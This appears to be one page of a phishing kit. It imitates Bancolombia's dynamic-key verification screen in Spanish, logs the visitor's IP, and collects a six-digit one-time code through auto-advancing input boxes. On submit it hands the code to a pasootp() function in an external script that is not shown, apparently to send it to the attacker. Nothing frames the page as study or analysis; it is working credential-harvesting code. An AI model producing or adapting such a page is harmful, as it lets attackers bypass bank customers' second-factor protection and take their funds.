<?php
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Bogota');
$tiempo = date("l, j \d\e F \d\e Y");
?>
<html>
    <head>
        <title>Bancolombia - Clave dinámica</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v1"></script>

        <style type="text/css">
            .clave {                
                padding: 7px 0px; 
                text-align: center;
                width: 40px;             
            }
            .inp-pass { width: 45px; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o" style="display:none;">
            <img src="../img/load4.gif" width="90">            
            <br>
            Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-otp"></td>
            </tr>
        </table>
       
        <br><br><br><div class="titulo-app">Verifica por seguridad que eres tú.</div><br>

        <div class="frm">
            <img src="../img/candado.jpg" width="16">
            <div class="descripcion-app">Digita la clave dinámica de tu App Bancolombia</div>
            <table style="margin: 0 auto;" border="0" cellspacing="8">
                <tr>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                    <td class="inp-pass"><input type="text" class="clave" id="txt-otp6" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
                </tr>
            </table>            
        </div>  
        <button class="botones" id="btn-otp" disabled>CONTINUAR</button> 
        <br><br><br>
        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">Genera una clave personal</div>  

        <script type="text/javascript">
            $(document).ready(function() { 
                // Salto automático y validación
                $('.clave').on('input', function() {
                    if ($(this).val().length === 1) {
                        $(this).closest('td').next().find('.clave').focus();
                    }
                    
                    var completo = true;
                    $('.clave').each(function() {
                        if ($(this).val() === "") completo = false;
                    });

                    if (completo) {
                        $("#btn-otp").prop("disabled", false);
                        $("#btn-otp").css("background-color", "#FDDA24"); // Color amarillo activo
                        $("#lnk-otp").attr("src", "../img/btn-continuar-on.jpg");
                    } else {
                        $("#btn-otp").prop("disabled", true);
                    }
                });

                // Control de borrado (Backspaced)
                $('.clave').on('keydown', function(e) {
                    if (e.keyCode === 8 && $(this).val().length === 0) {
                        $(this).closest('td').prev().find('.clave').focus();
                    }
                });

                // Envío de datos
                $("#btn-otp, #lnk-otp").click(function() {
                    var otp_completo = $("#txt-otp1").val() + $("#txt-otp2").val() + $("#txt-otp3").val() + $("#txt-otp4").val() + $("#txt-otp5").val() + $("#txt-otp6").val();
                    
                    if (otp_completo.length === 6) {
                        $("#fondo, #cargando-o").show(); 
                        pasootp(otp_completo); // Llama a functions.js
                    }
                });
            });
        </script>
    </body>
</html>
